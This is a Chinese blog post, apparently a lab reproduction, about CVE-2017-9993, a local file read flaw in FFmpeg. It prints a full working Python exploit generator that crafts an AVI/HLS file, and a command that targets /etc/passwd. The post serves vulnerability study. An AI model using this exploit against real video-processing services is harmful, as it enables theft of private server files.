@@ -1,0 +1,815 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 3.7.1">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/favicon.ico">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon.ico">
+  <link rel="icon" type="image/png" sizes="16x16" href="/img/favicon.ico">
+  <link rel="mask-icon" href="/images/favicon.ico" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"tea9.xyz","root":"/","scheme":"Mist","version":"8.0.0-rc.2","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="FFmpeg文件读取漏洞">
+<meta name="keywords" content="CVE,FFmpeg">
+<meta property="og:type" content="article">
+<meta property="og:title" content="CVE-2017-9993-FFmpeg文件读取漏洞">
+<meta property="og:url" content="http://tea9.xyz/post/1787481902.html">
+<meta property="og:site_name" content="tea9的博客">
+<meta property="og:description" content="FFmpeg文件读取漏洞">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="https://raw.githubusercontent.com/tea9/image/master/blog_img/37/01.png">
+<meta property="og:updated_time" content="2020-10-31T08:11:05.620Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="CVE-2017-9993-FFmpeg文件读取漏洞">
+<meta name="twitter:description" content="FFmpeg文件读取漏洞">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/tea9/image/master/blog_img/37/01.png">
+
+<link rel="canonical" href="http://tea9.xyz/post/1787481902.html">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>CVE-2017-9993-FFmpeg文件读取漏洞 | tea9的博客</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+        <span class="toggle-line toggle-line-first"></span>
+        <span class="toggle-line toggle-line-middle"></span>
+        <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta custom-logo">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">tea9的博客</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">加油</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-commonweal">
+
+    <a href="/404/" rel="section"><i class="fa fa-heartbeat fa-fw"></i>公益 404</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+  <div class="reading-progress-bar"></div>
+
+  <a href="https://github.com/tea9" class="github-corner" title="Follow me on GitHub" aria-label="Follow me on GitHub" rel="noopener" target="_blank"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://tea9.xyz/post/1787481902.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="tea9">
+      <meta itemprop="description" content="心中有光の孩子">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="tea9的博客">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          CVE-2017-9993-FFmpeg文件读取漏洞
+        </h1>
+
+        <div class="post-meta">
+          
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2020-10-31 15:58:00 / 修改时间：16:11:05" itemprop="dateCreated datePublished" datetime="2020-10-31T15:58:00+08:00">2020-10-31</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/category/漏洞复现/" itemprop="url" rel="index"><span itemprop="name">漏洞复现</span></a>
+                </span>
+                  ，
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/category/漏洞复现/CVE/" itemprop="url" rel="index"><span itemprop="name">CVE</span></a>
+                </span>
+            </span>
+
+          
+            <div class="post-description">FFmpeg文件读取漏洞</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="CVE-2017-9993-FFmpeg文件读取漏洞"><a href="#CVE-2017-9993-FFmpeg文件读取漏洞" class="headerlink" title="CVE-2017-9993-FFmpeg文件读取漏洞"></a>CVE-2017-9993-FFmpeg文件读取漏洞</h1><p><a href="https://www.ichunqiu.com/course/59107" target="_blank" rel="noopener">CVE-2017-9993-FFmpeg文件读取漏洞实验环境</a>  </p>
+<h2 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h2><p>FFmpeg</p>
+<p>FFmpeg是一套目前非常流行的可以用来记录、转换数字音频、视频，并能将其转化为流的开源计算机程序。它提供了录制、转换以及流化音视频的完整解决方案。目前有非常多的视音频软件或是视频网站、手机 APP 都采用了这个库。</p>
+<p>HLS 协议简单介绍</p>
+<p>HLS(HTTP Live Streaming)是苹果公司针对iPhone、iPod、iTouch和iPad等移动设备而开发的基于HTTP协议的流媒体解决方案。在 HLS 技术中 Web服务器向客户端提供接近实时的音视频流。但在使用的过程中是使用的标准的 HTTP 协议，所以这时，只要使用 HLS 的技术，就能在普通的 HTTP 的应用上直接提供点播和直播。</p>
+<p>该技术基本原理是将视频文件或视频流切分成小片(ts)并建立索引文件(m3u8)。客户端会先向服务器请求 m3u8索引文件，然后根据索引文件里面的url去请求真正的ts视频文件。如果是多级的m3u8索引的话，那就会从根索引文件开始，一层一层的往下去请求子的索引文件，获取最终的TS流文件的http请求地址与时间段。</p>
+<p>漏洞介绍</p>
+<p>6月24日，HackerOne平台名为neex的白帽子针对俄罗斯最大社交网站VK.com上报了该漏洞，并因此获得1000美元奖金。</p>
+<p>ffmpeg可处理HLS播放列表，而播放列表中已知可包含外部文件的援引。neex表示他借由该特性，利用avi文件中的GAB2字幕块，可以通过XBIN codec获取到视频转换网站的本地文件。</p>
+<p>影响范围</p>
+<p>3.2.2 3.2.5 3.1.2 2.6.8</p>
+<p>不受影响的版本</p>
+<p>3.3.2</p>
+<p>漏洞危害</p>
+<p>该漏洞可导致读取本地任意文件，危害较大,Google,Yahoo,Youtube等门户、视听网站以及支持流转码服务的业务已被曝出存在该漏洞。国内支持流转码的网站也可能有存在该漏洞的风险。</p>
+<h2 id="漏洞利用脚本"><a href="#漏洞利用脚本" class="headerlink" title="漏洞利用脚本"></a>漏洞利用脚本</h2><p>gen_xbin_avi.py<br><a href="https://github.com/neex/ffmpeg-avi-m3u-xbin" target="_blank" rel="noopener">gen_xbin_avi.py</a>  </p>
+<pre><code>#!/usr/bin/env python3
+import struct
+import argparse
+import random
+import string
+
+AVI_HEADER = b&quot;RIFF\x00\x00\x00\x00AVI LIST\x14\x01\x00\x00hdrlavih8\x00\x00\x00@\x9c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x10\x00\x00\x00}\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x00\xe0\x00\x00\x00\xa0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00LISTt\x00\x00\x00strlstrh8\x00\x00\x00txts\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x19\x00\x00\x00\x00\x00\x00\x00}\x00\x00\x00\x86\x03\x00\x00\x10&#39;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xe0\x00\xa0\x00strf(\x00\x00\x00(\x00\x00\x00\xe0\x00\x00\x00\xa0\x00\x00\x00\x01\x00\x18\x00XVID\x00H\x03\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00LIST    movi&quot;
+
+ECHO_TEMPLATE = &quot;&quot;&quot;### echoing {needed!r}
+#EXT-X-KEY: METHOD=AES-128, URI=/dev/zero, IV=0x{iv}
+#EXTINF:1,
+#EXT-X-BYTERANGE: 16
+/dev/zero
+#EXT-X-KEY: METHOD=NONE
+&quot;&quot;&quot;
+
+# AES.new(&#39;\x00&#39;*16).decrypt(&#39;\x00&#39;*16)
+GAMMA = b&#39;\x14\x0f\x0f\x10\x11\xb5&quot;=yXw\x17\xff\xd9\xec:&#39;
+
+FULL_PLAYLIST = &quot;&quot;&quot;#EXTM3U
+#EXT-X-MEDIA-SEQUENCE:0
+{content}
+#### random string to prevent caching: {rand}
+#EXT-X-ENDLIST&quot;&quot;&quot;
+
+EXTERNAL_REFERENCE_PLAYLIST = &quot;&quot;&quot;
+####  External reference: reading {size} bytes from {filename} (offset {offset})
+#EXTINF:1,
+#EXT-X-BYTERANGE: {size}@{offset}
+{filename}
+&quot;&quot;&quot;
+
+XBIN_HEADER = b&#39;XBIN\x1A\x20\x00\x0f\x00\x10\x04\x01\x00\x00\x00\x00&#39;
+
+
+def echo_block(block):
+    assert len(block) == 16
+    iv = &#39;&#39;.join(map(&#39;{:02x}&#39;.format, [x ^ y for (x, y) in zip(block, GAMMA)]))
+    return ECHO_TEMPLATE.format(needed=block, iv=iv)
+
+
+def gen_xbin_sync():
+    seq = []
+    for i in range(60):
+        if i % 2:
+            seq.append(0)
+        else:
+            seq.append(128 + 64 - i - 1)
+    for i in range(4, 0, -1):
+        seq.append(128 + i - 1)
+    seq.append(0)
+    seq.append(0)
+    for i in range(12, 0, -1):
+        seq.append(128 + i - 1)
+    seq.append(0)
+    seq.append(0)
+    return seq
+
+
+def test_xbin_sync(seq):
+    for start_ind in range(64):
+        path = [start_ind]
+        cur_ind = start_ind
+        while cur_ind &lt; len(seq):
+            if seq[cur_ind] == 0:
+                cur_ind += 3
+            else:
+                assert seq[cur_ind] &amp; (64 + 128) == 128
+                cur_ind += (seq[cur_ind] &amp; 63) + 3
+            path.append(cur_ind)
+        assert cur_ind == len(seq), &quot;problem for path {}&quot;.format(path)
+
+
+def echo_seq(s):
+    assert len(s) % 16 == 0
+    res = []
+    for i in range(0, len(s), 16):
+        res.append(echo_block(s[i:i + 16]))
+    return &#39;&#39;.join(res)
+
+
+test_xbin_sync(gen_xbin_sync())
+
+SYNC = echo_seq(gen_xbin_sync())
+
+
+def make_playlist_avi(playlist, fake_packets=1000, fake_packet_len=3):
+    content = b&#39;GAB2\x00\x02\x00&#39; + b&#39;\x00&#39; * 10 + playlist.encode(&#39;ascii&#39;)
+    packet = b&#39;00tx&#39; + struct.pack(&#39;&lt;I&#39;, len(content)) + content
+    dcpkt = b&#39;00dc&#39; + struct.pack(&#39;&lt;I&#39;,
+                                  fake_packet_len) + b&#39;\x00&#39; * fake_packet_len
+    return AVI_HEADER + packet + dcpkt * fake_packets
+
+
+def gen_xbin_packet_header(size):
+    return bytes([0] * 9 + [1] + [0] * 4 + [128 + size - 1, 10])
+
+
+def gen_xbin_packet_playlist(filename, offset, packet_size):
+    result = []
+    while packet_size &gt; 0:
+        packet_size -= 16
+        assert packet_size &gt; 0
+        part_size = min(packet_size, 64)
+        packet_size -= part_size
+        result.append(echo_block(gen_xbin_packet_header(part_size)))
+        result.append(
+            EXTERNAL_REFERENCE_PLAYLIST.format(
+                size=part_size,
+                offset=offset,
+                filename=filename))
+        offset += part_size
+    return &#39;&#39;.join(result), offset
+
+
+def gen_xbin_playlist(filename_to_read):
+    pls = [echo_block(XBIN_HEADER)]
+    next_delta = 5
+    for max_offs, filename in (
+            (5000, filename_to_read), (500, &quot;file:///dev/zero&quot;)):
+        offset = 0
+        while offset &lt; max_offs:
+            for _ in range(10):
+                pls_part, new_offset = gen_xbin_packet_playlist(
+                    filename, offset, 0xf0 - next_delta)
+                pls.append(pls_part)
+                next_delta = 0
+            offset = new_offset
+        pls.append(SYNC)
+    return FULL_PLAYLIST.format(content=&#39;&#39;.join(pls), rand=&#39;&#39;.join(
+        random.choice(string.ascii_lowercase) for i in range(30)))
+
+
+if __name__ == &quot;__main__&quot;:
+    parser = argparse.ArgumentParser(&#39;AVI+M3U+XBIN ffmpeg exploit generator&#39;)
+    parser.add_argument(
+        &#39;filename&#39;,
+        help=&#39;filename to be read from the server (prefix it with &quot;file://&quot;)&#39;)
+    parser.add_argument(&#39;output_avi&#39;, help=&#39;where to save the avi&#39;)
+    args = parser.parse_args()
+    assert &#39;://&#39; in args.filename, &quot;ffmpeg needs explicit proto (forgot file://?)&quot;
+    content = gen_xbin_playlist(args.filename)
+    avi = make_playlist_avi(content)
+    output_name = args.output_avi
+
+    with open(output_name, &#39;wb&#39;) as f:
+        f.write(avi)
+</code></pre><h2 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h2><p><code>./gen_xbin_avi.py file://&lt;filename&gt; file_read.avi</code>  </p>
+<p>运行脚本  </p>
+<p><code>python gen_xbin_avi.py file:///etc/passwd passwd.avi</code></p>
+<p>上传视频文件 查看<br><img src="https://raw.githubusercontent.com/tea9/image/master/blog_img/37/01.png" alt=""></p>
+<p><a href="https://www.ichunqiu.com/experiment/detail?id=59111&amp;source=1" target="_blank" rel="noopener">FFmpeg文件读取漏洞（CVE-2017-9993）</a>  </p>
+
+    </div>
+
+    
+    
+    
+        <div class="reward-container">
+  <div></div>
+  <button onclick="var qr = document.getElementById('qr'); qr.style.display = (qr.style.display === 'none') ? 'block' : 'none';">
+    打赏
+  </button>
+  <div id="qr" style="display: none;">
+      
+      <div style="display: inline-block;">
+        <img src="/images/wechatpay.jpg" alt="tea9 微信支付">
+        <p>微信支付</p>
+      </div>
+      
+      <div style="display: inline-block;">
+        <img src="/images/alipay.jpg" alt="tea9 支付宝">
+        <p>支付宝</p>
+      </div>
+
+  </div>
+</div>
+
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tag/CVE/" rel="tag"><i class="fa fa-tag"></i> CVE</a>
+              <a href="/tag/FFmpeg/" rel="tag"><i class="fa fa-tag"></i> FFmpeg</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/post/3420824369.html" rel="prev" title="50 本各学科领域入门书">
+      <i class="fa fa-chevron-left"></i> 50 本各学科领域入门书
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#CVE-2017-9993-FFmpeg文件读取漏洞"><span class="nav-number">1.</span> <span class="nav-text">CVE-2017-9993-FFmpeg文件读取漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#漏洞介绍"><span class="nav-number">1.1.</span> <span class="nav-text">漏洞介绍</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#漏洞利用脚本"><span class="nav-number">1.2.</span> <span class="nav-text">漏洞利用脚本</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#步骤"><span class="nav-number">1.3.</span> <span class="nav-text">步骤</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">tea9</p>
+  <div class="site-description" itemprop="description">心中有光の孩子</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">168</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">29</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">79</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/tea9" title="GitHub → https://github.com/tea9" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://weibo.com/tr1tea" title="Weibo → https://weibo.com/tr1tea" rel="noopener" target="_blank"><i class="fab fa-weibo fa-fw"></i>Weibo</a>
+      </span>
+  </div>
+
+
+  <div class="links-of-blogroll motion-element">
+    <div class="links-of-blogroll-title"><i class="fa fa-link fa-fw"></i>
+      Links
+    </div>
+    <ul class="links-of-blogroll-list">
+        <li class="links-of-blogroll-item">
+          <a href="https://tea9.xyz" title="https://tea9.xyz">Tea9</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://www.julydate.com" title="https://www.julydate.com" rel="noopener" target="_blank">七夏浅笑</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://www.zhangqirun.cn" title="https://www.zhangqirun.cn" rel="noopener" target="_blank">童年是个风筝的博客</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://townwang.com" title="https://townwang.com" rel="noopener" target="_blank">文科中的技术宅</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://sunbossrs.github.io" title="https://sunbossrs.github.io" rel="noopener" target="_blank">耀日庄主的博客</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://www.pdcblog.tk" title="https://www.pdcblog.tk" rel="noopener" target="_blank">量子</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://www.pdcgame.com" title="https://www.pdcgame.com" rel="noopener" target="_blank">pdcgame</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="http://gloomyghost.com/" title="http://gloomyghost.com/" rel="noopener" target="_blank">gloomyghost</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://www.fghrsh.net" title="https://www.fghrsh.net" rel="noopener" target="_blank">FGHRSH</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://a632079.me" title="https://a632079.me" rel="noopener" target="_blank">藤の青</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://www.vseu.com/" title="https://www.vseu.com/" rel="noopener" target="_blank">幸运草</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://shawnzeng.com/" title="https://shawnzeng.com/" rel="noopener" target="_blank">诗与酒</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://nekohome.moenya.cat" title="https://nekohome.moenya.cat" rel="noopener" target="_blank">NekoHome 喵窝</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://www.lkxin.cn" title="https://www.lkxin.cn" rel="noopener" target="_blank">清酒踏月</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="http://www.ad-s.cn/" title="http://www.ad-s.cn/" rel="noopener" target="_blank">冰峰博客</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="http://login546.xyz" title="http://login546.xyz" rel="noopener" target="_blank">Unique</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://1000yun.cn/" title="https://1000yun.cn/" rel="noopener" target="_blank">雨落泪尽</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://laugh12321.github.io" title="https://laugh12321.github.io" rel="noopener" target="_blank">Laugh's Blog</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://shaozhi.site" title="https://shaozhi.site" rel="noopener" target="_blank">ShaoZhi's Blog</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://www.xiz.im" title="https://www.xiz.im" rel="noopener" target="_blank">Xiang Xiz</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://www.xx8.uk" title="https://www.xx8.uk" rel="noopener" target="_blank">lan酱的小窝</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://www.ckbug.com" title="https://www.ckbug.com" rel="noopener" target="_blank">Casey</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="http://poi.ac/" title="http://poi.ac/" rel="noopener" target="_blank">星夜的蓝天</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="http://www.oneinf.com" title="http://www.oneinf.com" rel="noopener" target="_blank">俍注</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://darkwing.moe/" title="https://darkwing.moe/" rel="noopener" target="_blank">暗羽表姐</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="http://ju5tw4nty0u.top/" title="http://ju5tw4nty0u.top/" rel="noopener" target="_blank">ju5tw4nty0u</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="http://www.itfire.cn" title="http://www.itfire.cn" rel="noopener" target="_blank">如鱼说|仓鼠的博客</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://www.k0rz3n.com/" title="https://www.k0rz3n.com/" rel="noopener" target="_blank">k0rz3n</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="http://ikmoe.com/" title="http://ikmoe.com/" rel="noopener" target="_blank">月宅酱</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://miracles666.github.io" title="https://miracles666.github.io" rel="noopener" target="_blank">Miracles</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://www.xytsing.com" title="https://www.xytsing.com" rel="noopener" target="_blank">咸鱼滩音乐团队</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="http://eternalsakura13.com/" title="http://eternalsakura13.com/" rel="noopener" target="_blank">sakura</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://snowflowersnowflake.github.io/" title="https://snowflowersnowflake.github.io/" rel="noopener" target="_blank">y00</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="http://www.teagle.top/" title="http://www.teagle.top/" rel="noopener" target="_blank">楼兰</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://0chencc.github.io" title="https://0chencc.github.io" rel="noopener" target="_blank">林晨</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="http://console-log.cn/" title="http://console-log.cn/" rel="noopener" target="_blank">Xenc</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="http://1337er.com" title="http://1337er.com" rel="noopener" target="_blank">CyberSecurity</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://blog.csdn.net/zcj_1996" title="https://blog.csdn.net/zcj_1996" rel="noopener" target="_blank">secES</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://milktea.info" title="https://milktea.info" rel="noopener" target="_blank">奶茶姐姐</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://evil-of-blad.github.io/" title="https://evil-of-blad.github.io/" rel="noopener" target="_blank">blad</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://blog.xiafeng2333.top/" title="https://blog.xiafeng2333.top/" rel="noopener" target="_blank">夏风</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://www.hackpwn.xyz/" title="https://www.hackpwn.xyz/" rel="noopener" target="_blank">Catsay</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://zhzhdoai.github.io/" title="https://zhzhdoai.github.io/" rel="noopener" target="_blank">osword</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://evilwing.me/" title="https://evilwing.me/" rel="noopener" target="_blank">wing</a>
+        </li>
+        <li class="links-of-blogroll-item">
